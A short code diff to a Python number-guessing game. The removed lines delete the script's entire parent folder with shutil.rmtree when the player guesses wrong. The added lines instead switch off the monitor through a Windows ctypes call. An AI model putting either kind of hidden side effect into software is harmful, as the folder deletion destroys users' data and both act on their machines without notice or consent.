@@ -1,7 +1,5 @@
 import random
-import os
-import shutil
-from pathlib import Path
+import ctypes
 
 a = random.randint(1, 10)
 b = int(input("Enter a number between 1 and 10: "))
@@ -9,10 +7,5 @@ b = int(input("Enter a number between 1 and 10: "))
 if a == b:
     print("You guessed it!")
 else:
-    print(f"Sorry, the correct number was {a}.")
-
-    script_path = Path(__file__).resolve()
-    parent_folder = script_path.parent
-
-    print("Deleting folder:", parent_folder)
-    shutil.rmtree(parent_folder)
+    print("Wrong! Turning off screen...")
+    ctypes.windll.user32.SendMessageW(0xFFFF, 0x0112, 0xF170, 2)
